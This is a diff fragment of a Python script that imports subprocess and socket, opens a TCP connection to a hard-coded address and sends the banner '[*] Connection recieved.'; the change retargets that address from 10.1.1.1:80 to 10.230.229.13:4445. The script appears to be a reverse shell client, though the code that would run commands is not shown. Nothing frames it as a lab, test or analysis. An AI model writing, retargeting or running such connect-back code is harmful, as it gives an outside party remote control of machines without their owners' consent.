@@ -2,8 +2,8 @@ import subprocess
 import socket
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '10.1.1.1'
-port = 80
+host = '10.230.229.13'
+port = 4445
 
 sock.connect((host, port))
 sock.send("[*] Connection recieved.")
